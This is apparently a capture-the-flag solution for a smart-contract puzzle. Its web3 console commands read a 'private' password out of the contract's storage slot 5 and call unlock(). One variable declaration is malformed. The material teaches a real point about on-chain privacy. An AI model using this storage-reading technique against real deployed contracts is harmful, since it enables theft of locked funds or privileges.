//Start by figuring out the storage layout 

//slot 0 
    // bool public locked = true;

//slot 1
    //uint256 public ID = block.timestamp;

//slot 2
    // uint8 private flattening = 10;
    // uint8 private denomination = 255;
    // uint16 private awkwardness = uint16(now);

//slot 3-5
    //bytes32[3] private data;

//We are interested in the the third element in the data array, which would be slot 5!
//0x6c4d4527c8d3074251b61c8427ed0c1e97e99ef46b262eb15c9783f784679095
let data2 =await web3.eth.getStorageAt(contract.address, 5)

//data2 is 32 bytes and the password is only 16 bytes ,so we take only the first 32 characters of data2  + the 0x which would make 34 characters

let password = password = data2.substr(0, 34)

await contract.unlock(password)

//confirm contract is not locked
await contract.locked()

//submit contract